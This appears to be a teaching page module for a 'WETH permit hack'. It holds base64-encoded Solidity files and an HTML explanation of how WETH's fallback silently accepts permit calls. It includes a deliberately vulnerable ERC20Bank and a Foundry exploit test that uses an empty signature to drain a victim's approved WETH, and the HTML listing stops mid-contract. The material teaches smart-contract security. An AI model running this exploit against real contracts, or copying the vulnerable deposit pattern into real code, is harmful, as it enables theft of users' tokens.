// metadata
export const version = "0.8.24"
export const title = "WETH Permit"
export const description = "An example of WETH permit hack"

export const keywords = [
    "hack",
    "security",
    "weth",
    "permit",
]

export const codes = [
    {
        fileName: "ERC20.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKYWJzdHJhY3QgY29udHJhY3QgRVJDMjAgewogICAgZXZlbnQgVHJhbnNmZXIoYWRkcmVzcyBpbmRleGVkIGZyb20sIGFkZHJlc3MgaW5kZXhlZCB0bywgdWludDI1NiBhbW91bnQpOwogICAgZXZlbnQgQXBwcm92YWwoCiAgICAgICAgYWRkcmVzcyBpbmRleGVkIG93bmVyLCBhZGRyZXNzIGluZGV4ZWQgc3BlbmRlciwgdWludDI1NiBhbW91bnQKICAgICk7CgogICAgc3RyaW5nIHB1YmxpYyBuYW1lOwogICAgc3RyaW5nIHB1YmxpYyBzeW1ib2w7CiAgICB1aW50OCBwdWJsaWMgaW1tdXRhYmxlIGRlY2ltYWxzOwoKICAgIHVpbnQyNTYgcHVibGljIHRvdGFsU3VwcGx5OwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpKSBwdWJsaWMgYWxsb3dhbmNlOwoKICAgIGNvbnN0cnVjdG9yKHN0cmluZyBtZW1vcnkgX25hbWUsIHN0cmluZyBtZW1vcnkgX3N5bWJvbCwgdWludDggX2RlY2ltYWxzKSB7CiAgICAgICAgbmFtZSA9IF9uYW1lOwogICAgICAgIHN5bWJvbCA9IF9zeW1ib2w7CiAgICAgICAgZGVjaW1hbHMgPSBfZGVjaW1hbHM7CiAgICB9CgogICAgZnVuY3Rpb24gYXBwcm92ZShhZGRyZXNzIHNwZW5kZXIsIHVpbnQyNTYgYW1vdW50KQogICAgICAgIHB1YmxpYwogICAgICAgIHZpcnR1YWwKICAgICAgICByZXR1cm5zIChib29sKQogICAgewogICAgICAgIGFsbG93YW5jZVttc2cuc2VuZGVyXVtzcGVuZGVyXSA9IGFtb3VudDsKICAgICAgICBlbWl0IEFwcHJvdmFsKG1zZy5zZW5kZXIsIHNwZW5kZXIsIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gdHJhbnNmZXIoYWRkcmVzcyB0bywgdWludDI1NiBhbW91bnQpCiAgICAgICAgcHVibGljCiAgICAgICAgdmlydHVhbAogICAgICAgIHJldHVybnMgKGJvb2wpCiAgICB7CiAgICAgICAgYmFsYW5jZU9mW21zZy5zZW5kZXJdIC09IGFtb3VudDsKICAgICAgICB1bmNoZWNrZWQgewogICAgICAgICAgICBiYWxhbmNlT2ZbdG9dICs9IGFtb3VudDsKICAgICAgICB9CiAgICAgICAgZW1pdCBUcmFuc2Zlcihtc2cuc2VuZGVyLCB0bywgYW1vdW50KTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiB0cmFuc2ZlckZyb20oYWRkcmVzcyBmcm9tLCBhZGRyZXNzIHRvLCB1aW50MjU2IGFtb3VudCkKICAgICAgICBwdWJsaWMKICAgICAgICB2aXJ0dWFsCiAgICAgICAgcmV0dXJucyAoYm9vbCkKICAgIHsKICAgICAgICB1aW50MjU2IGFsbG93ZWQgPSBhbGxvd2FuY2VbZnJvbV1bbXNnLnNlbmRlcl07CiAgICAgICAgaWYgKGFsbG93ZWQgIT0gdHlwZSh1aW50MjU2KS5tYXgpIHsKICAgICAgICAgICAgYWxsb3dhbmNlW2Zyb21dW21zZy5zZW5kZXJdID0gYWxsb3dlZCAtIGFtb3VudDsKICAgICAgICB9CiAgICAgICAgYmFsYW5jZU9mW2Zyb21dIC09IGFtb3VudDsKICAgICAgICB1bmNoZWNrZWQgewogICAgICAgICAgICBiYWxhbmNlT2ZbdG9dICs9IGFtb3VudDsKICAgICAgICB9CiAgICAgICAgZW1pdCBUcmFuc2Zlcihmcm9tLCB0bywgYW1vdW50KTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiBfbWludChhZGRyZXNzIHRvLCB1aW50MjU2IGFtb3VudCkgaW50ZXJuYWwgdmlydHVhbCB7CiAgICAgICAgdG90YWxTdXBwbHkgKz0gYW1vdW50OwogICAgICAgIHVuY2hlY2tlZCB7CiAgICAgICAgICAgIGJhbGFuY2VPZlt0b10gKz0gYW1vdW50OwogICAgICAgIH0KICAgICAgICBlbWl0IFRyYW5zZmVyKGFkZHJlc3MoMCksIHRvLCBhbW91bnQpOwogICAgfQoKICAgIGZ1bmN0aW9uIF9idXJuKGFkZHJlc3MgZnJvbSwgdWludDI1NiBhbW91bnQpIGludGVybmFsIHZpcnR1YWwgewogICAgICAgIGJhbGFuY2VPZltmcm9tXSAtPSBhbW91bnQ7CiAgICAgICAgdW5jaGVja2VkIHsKICAgICAgICAgICAgdG90YWxTdXBwbHkgLT0gYW1vdW50OwogICAgICAgIH0KICAgICAgICBlbWl0IFRyYW5zZmVyKGZyb20sIGFkZHJlc3MoMCksIGFtb3VudCk7CiAgICB9Cn0K",
    },
    {
        fileName: "ERC20Bank.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW1wb3J0ICIuL0lFUkMyMFBlcm1pdC5zb2wiOwoKY29udHJhY3QgRVJDMjBCYW5rIHsKICAgIElFUkMyMFBlcm1pdCBwdWJsaWMgaW1tdXRhYmxlIHRva2VuOwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfdG9rZW4pIHsKICAgICAgICB0b2tlbiA9IElFUkMyMFBlcm1pdChfdG9rZW4pOwogICAgfQoKICAgIGZ1bmN0aW9uIGRlcG9zaXQodWludDI1NiBfYW1vdW50KSBleHRlcm5hbCB7CiAgICAgICAgdG9rZW4udHJhbnNmZXJGcm9tKG1zZy5zZW5kZXIsIGFkZHJlc3ModGhpcyksIF9hbW91bnQpOwogICAgICAgIGJhbGFuY2VPZlttc2cuc2VuZGVyXSArPSBfYW1vdW50OwogICAgfQoKICAgIGZ1bmN0aW9uIGRlcG9zaXRXaXRoUGVybWl0KAogICAgICAgIGFkZHJlc3Mgb3duZXIsCiAgICAgICAgYWRkcmVzcyBzcGVuZGVyLAogICAgICAgIHVpbnQyNTYgYW1vdW50LAogICAgICAgIHVpbnQyNTYgZGVhZGxpbmUsCiAgICAgICAgdWludDggdiwKICAgICAgICBieXRlczMyIHIsCiAgICAgICAgYnl0ZXMzMiBzCiAgICApIGV4dGVybmFsIHsKICAgICAgICB0b2tlbi5wZXJtaXQob3duZXIsIHNwZW5kZXIsIGFtb3VudCwgZGVhZGxpbmUsIHYsIHIsIHMpOwogICAgICAgIHRva2VuLnRyYW5zZmVyRnJvbShvd25lciwgYWRkcmVzcyh0aGlzKSwgYW1vdW50KTsKICAgICAgICBiYWxhbmNlT2Zbc3BlbmRlcl0gKz0gYW1vdW50OwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KHVpbnQyNTYgX2Ftb3VudCkgZXh0ZXJuYWwgewogICAgICAgIGJhbGFuY2VPZlttc2cuc2VuZGVyXSAtPSBfYW1vdW50OwogICAgICAgIHRva2VuLnRyYW5zZmVyKG1zZy5zZW5kZXIsIF9hbW91bnQpOwogICAgfQp9Cg==",
    },
    {
        fileName: "ERC20BankExploitTest.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW1wb3J0IHtUZXN0LCBjb25zb2xlMn0gZnJvbSAiZm9yZ2Utc3RkL1Rlc3Quc29sIjsKaW1wb3J0IHtXRVRIfSBmcm9tICIuLi8uLi8uLi9zcmMvaGFja3Mvd2V0aC1wZXJtaXQvV0VUSC5zb2wiOwppbXBvcnQge0VSQzIwQmFua30gZnJvbSAiLi4vLi4vLi4vc3JjL2hhY2tzL3dldGgtcGVybWl0L0VSQzIwQmFuay5zb2wiOwoKY29udHJhY3QgRVJDMjBCYW5rRXhwbG9pdFRlc3QgaXMgVGVzdCB7CiAgICBXRVRIIHByaXZhdGUgd2V0aDsKICAgIEVSQzIwQmFuayBwcml2YXRlIGJhbms7CiAgICBhZGRyZXNzIHByaXZhdGUgY29uc3RhbnQgdXNlciA9IGFkZHJlc3MoMTEpOwogICAgYWRkcmVzcyBwcml2YXRlIGNvbnN0YW50IGF0dGFja2VyID0gYWRkcmVzcygxMik7CgogICAgZnVuY3Rpb24gc2V0VXAoKSBwdWJsaWMgewogICAgICAgIHdldGggPSBuZXcgV0VUSCgpOwogICAgICAgIGJhbmsgPSBuZXcgRVJDMjBCYW5rKGFkZHJlc3Mod2V0aCkpOwoKICAgICAgICBkZWFsKHVzZXIsIDEwMCAqIDFlMTgpOwogICAgICAgIHZtLnN0YXJ0UHJhbmsodXNlcik7CiAgICAgICAgd2V0aC5kZXBvc2l0e3ZhbHVlOiAxMDAgKiAxZTE4fSgpOwogICAgICAgIHdldGguYXBwcm92ZShhZGRyZXNzKGJhbmspLCB0eXBlKHVpbnQyNTYpLm1heCk7CiAgICAgICAgYmFuay5kZXBvc2l0KDFlMTgpOwogICAgICAgIHZtLnN0b3BQcmFuaygpOwogICAgfQoKICAgIGZ1bmN0aW9uIHRlc3QoKSBwdWJsaWMgewogICAgICAgIHVpbnQyNTYgYmFsID0gd2V0aC5iYWxhbmNlT2YodXNlcik7CiAgICAgICAgdm0uc3RhcnRQcmFuayhhdHRhY2tlcik7CiAgICAgICAgYmFuay5kZXBvc2l0V2l0aFBlcm1pdCh1c2VyLCBhdHRhY2tlciwgYmFsLCAwLCAwLCAiIiwgIiIpOwogICAgICAgIGJhbmsud2l0aGRyYXcoYmFsKTsKICAgICAgICB2bS5zdG9wUHJhbmsoKTsKCiAgICAgICAgYXNzZXJ0RXEod2V0aC5iYWxhbmNlT2YodXNlciksIDAsICJXRVRIIGJhbGFuY2Ugb2YgdXNlciIpOwogICAgICAgIGFzc2VydEVxKAogICAgICAgICAgICB3ZXRoLmJhbGFuY2VPZihhZGRyZXNzKGF0dGFja2VyKSksCiAgICAgICAgICAgIDk5ICogMWUxOCwKICAgICAgICAgICAgIldFVEggYmFsYW5jZSBvZiBhdHRhY2tlciIKICAgICAgICApOwogICAgfQp9Cg==",
    },
    {
        fileName: "IERC20.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW50ZXJmYWNlIElFUkMyMCB7CiAgICBmdW5jdGlvbiB0b3RhbFN1cHBseSgpIGV4dGVybmFsIHZpZXcgcmV0dXJucyAodWludDI1Nik7CiAgICBmdW5jdGlvbiBiYWxhbmNlT2YoYWRkcmVzcyBhY2NvdW50KSBleHRlcm5hbCB2aWV3IHJldHVybnMgKHVpbnQyNTYpOwogICAgZnVuY3Rpb24gYWxsb3dhbmNlKGFkZHJlc3Mgb3duZXIsIGFkZHJlc3Mgc3BlbmRlcikKICAgICAgICBleHRlcm5hbAogICAgICAgIHZpZXcKICAgICAgICByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGFwcHJvdmUoYWRkcmVzcyBzcGVuZGVyLCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCk7CiAgICBmdW5jdGlvbiB0cmFuc2ZlcihhZGRyZXNzIGRzdCwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwogICAgZnVuY3Rpb24gdHJhbnNmZXJGcm9tKGFkZHJlc3Mgc3JjLCBhZGRyZXNzIGRzdCwgdWludDI1NiBhbW91bnQpCiAgICAgICAgZXh0ZXJuYWwKICAgICAgICByZXR1cm5zIChib29sKTsKCiAgICBldmVudCBUcmFuc2ZlcihhZGRyZXNzIGluZGV4ZWQgc3JjLCBhZGRyZXNzIGluZGV4ZWQgZHN0LCB1aW50MjU2IGFtb3VudCk7CiAgICBldmVudCBBcHByb3ZhbCgKICAgICAgICBhZGRyZXNzIGluZGV4ZWQgb3duZXIsIGFkZHJlc3MgaW5kZXhlZCBzcGVuZGVyLCB1aW50MjU2IGFtb3VudAogICAgKTsKfQo=",
    },
    {
        fileName: "IERC20Permit.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW1wb3J0ICIuL0lFUkMyMC5zb2wiOwoKaW50ZXJmYWNlIElFUkMyMFBlcm1pdCBpcyBJRVJDMjAgewogICAgZnVuY3Rpb24gcGVybWl0KAogICAgICAgIGFkZHJlc3Mgb3duZXIsCiAgICAgICAgYWRkcmVzcyBzcGVuZGVyLAogICAgICAgIHVpbnQyNTYgdmFsdWUsCiAgICAgICAgdWludDI1NiBkZWFkbGluZSwKICAgICAgICB1aW50OCB2LAogICAgICAgIGJ5dGVzMzIgciwKICAgICAgICBieXRlczMyIHMKICAgICkgZXh0ZXJuYWw7Cn0K",
    },
    {
        fileName: "WETH.sol",
        code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW1wb3J0ICIuL0VSQzIwLnNvbCI7Cgpjb250cmFjdCBXRVRIIGlzIEVSQzIwIHsKICAgIGV2ZW50IERlcG9zaXQoYWRkcmVzcyBpbmRleGVkIGFjY291bnQsIHVpbnQyNTYgYW1vdW50KTsKICAgIGV2ZW50IFdpdGhkcmF3KGFkZHJlc3MgaW5kZXhlZCBhY2NvdW50LCB1aW50MjU2IGFtb3VudCk7CgogICAgY29uc3RydWN0b3IoKSBFUkMyMCgiV3JhcHBlZCBFdGhlciIsICJXRVRIIiwgMTgpIHt9CgogICAgZmFsbGJhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICBkZXBvc2l0KCk7CiAgICB9CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICBfbWludChtc2cuc2VuZGVyLCBtc2cudmFsdWUpOwogICAgICAgIGVtaXQgRGVwb3NpdChtc2cuc2VuZGVyLCBtc2cudmFsdWUpOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCB7CiAgICAgICAgX2J1cm4obXNnLnNlbmRlciwgYW1vdW50KTsKICAgICAgICBwYXlhYmxlKG1zZy5zZW5kZXIpLnRyYW5zZmVyKGFtb3VudCk7CiAgICAgICAgZW1pdCBXaXRoZHJhdyhtc2cuc2VuZGVyLCBhbW91bnQpOwogICAgfQp9Cg==",
    },
]

const html = `<h3>Vulnerability</h3>
<p>Most ERC20 have the <code>permit</code> function to approve a spender if a valid signature is provided.</p>
<p>However <code>WETH</code> does not. Surprisingly, when <code>permit</code> is called on <code>WETH</code>, the function call will execute without any errors.</p>
<p>This is because the <code>fallback</code> inside <code>WETH</code> is execute when <code>permit</code> is called.</p>
<h3>Example</h3>
<ol start="0">
<li>Alice gives infinite approval for <code>ERC20Bank</code> to spend <code>WETH</code></li>
<li>Alice calls <code>deposit</code>, deposits 1 WETH into <code>ERC20Bank</code></li>
<li>Attacker calls <code>depositWithPermit</code>, passes an empty signature and transfers all tokens from Alice into <code>ERC20Bank</code>, crediting the attacker for the deposit.</li>
<li>Attacker withdraws all tokens credited to him.</li>
</ol>
<h3>ERC20Bank</h3>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">"./IERC20Permit.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ERC20Bank</span> </span>{
    IERC20Permit <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> token;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balanceOf;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _token</span>) </span>{
        token <span class="hljs-operator">=</span> IERC20Permit(_token);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        token.transferFrom(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), _amount);
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> _amount;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">depositWithPermit</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> owner,
        <span class="hljs-keyword">address</span> spender,
        <span class="hljs-keyword">uint256</span> amount,
        <span class="hljs-keyword">uint256</span> deadline,
        <span class="hljs-keyword">uint8</span> v,
        <span class="hljs-keyword">bytes32</span> r,
        <span class="hljs-keyword">bytes32</span> s
    </span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        token.permit(owner, spender, amount, deadline, v, r, s);
        token.transferFrom(owner, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>), amount);
        balanceOf[spender] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _amount;
        token.<span class="hljs-built_in">transfer</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount);
    }
}
</code></pre><h3>Exploit</h3>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">import</span> {<span class="hljs-title">Test</span>, <span class="hljs-title">console2</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"forge-std/Test.sol"</span>;
<span class="hljs-keyword">import</span> {<span class="hljs-title">WETH</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"../../../src/hacks/weth-permit/WETH.sol"</span>;
<span class="hljs-keyword">import</span> {<span class="hljs-title">ERC20Bank</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"../../../src/hacks/weth-permit/ERC20Bank.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ERC20BankExploitTest</span> <span class="hljs-keyword">is</span> <span class="hljs-title">Test</span> </span>{
    WETH <span class="hljs-keyword">private</span> weth;
    ERC20Bank <span class="hljs-keyword">private</span> bank;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constant</span> user <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-number">11</span>);
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">constant</span> attacker <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-number">12</span>);

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUp</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        weth <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> WETH();
        bank <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> ERC20Bank(<span class="hljs-keyword">address</span>(weth));

        deal(user, <span class="hljs-number">100</span> <span class="hljs-operator">*</span> <span class="hljs-number">1e18</span>);
        vm.startPrank(user);
        weth.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">100</span> <span class="hljs-operator">*</span> <span class="hljs-number">1e18</span>}();
        weth.approve(<span class="hljs-keyword">address</span>(bank), <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span>);
        bank.deposit(<span class="hljs-number">1e18</span>);
        vm.stopPrank();
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-keyword">uint256</span> bal <span class="hljs-operator">=</span> weth.balanceOf(user);
        vm.startPrank(attacker);
        bank.depositWithPermit(user, attacker, bal, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);
        bank.withdraw(bal);
        vm.stopPrank();

        assertEq(weth.balanceOf(user), <span class="hljs-number">0</span>, <span class="hljs-string">"WETH balance of user"</span>);
        assertEq(
            weth.balanceOf(<span class="hljs-keyword">address</span>(attacker)),
            <span class="hljs-number">99</span> <span class="hljs-operator">*</span> <span class="hljs-number">1e18</span>,
            <span class="hljs-string">"WETH balance of attacker"</span>
        );
    }
}
</code></pre><h3>Other contracts</h3>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">totalSupply</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> account</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allowance</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> owner, <span class="hljs-keyword">address</span> spender</span>)
        <span class="hljs-title"><span class="hljs-keyword">external</span></span>
        <span class="hljs-title"><span class="hljs-keyword">view</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> dst, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> src, <span class="hljs-keyword">address</span> dst, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">external</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> src, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> dst, <span class="hljs-keyword">uint256</span> amount</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Approval</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> spender, <span class="hljs-keyword">uint256</span> amount
    </span>)</span>;
}
</code></pre><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">"./IERC20.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IERC20Permit</span> <span class="hljs-keyword">is</span> <span class="hljs-title">IERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">permit</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> owner,
        <span class="hljs-keyword">address</span> spender,
        <span class="hljs-keyword">uint256</span> value,
        <span class="hljs-keyword">uint256</span> deadline,
        <span class="hljs-keyword">uint8</span> v,
        <span class="hljs-keyword">bytes32</span> r,
        <span class="hljs-keyword">bytes32</span> s
    </span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span></span>;
}
</code></pre><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> to, <span class="hljs-keyword">uint256</span> amount</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Approval</span>(<span class="hljs-params">
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> spender, <span class="hljs-keyword">uint256</span> amount
    </span>)</span>;

    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> name;
    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> symbol;
    <span class="hljs-keyword">uint8</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> decimals;

    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> totalSupply;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balanceOf;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>)) <span class="hljs-keyword">public</span> allowance;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _name, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _symbol, <span class="hljs-keyword">uint8</span> _decimals</span>) </span>{
        name <span class="hljs-operator">=</span> _name;
        symbol <span class="hljs-operator">=</span> _symbol;
        decimals <span class="hljs-operator">=</span> _decimals;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">approve</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> spender, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">virtual</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        allowance[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>][spender] <span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">emit</span> Approval(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, spender, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">virtual</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
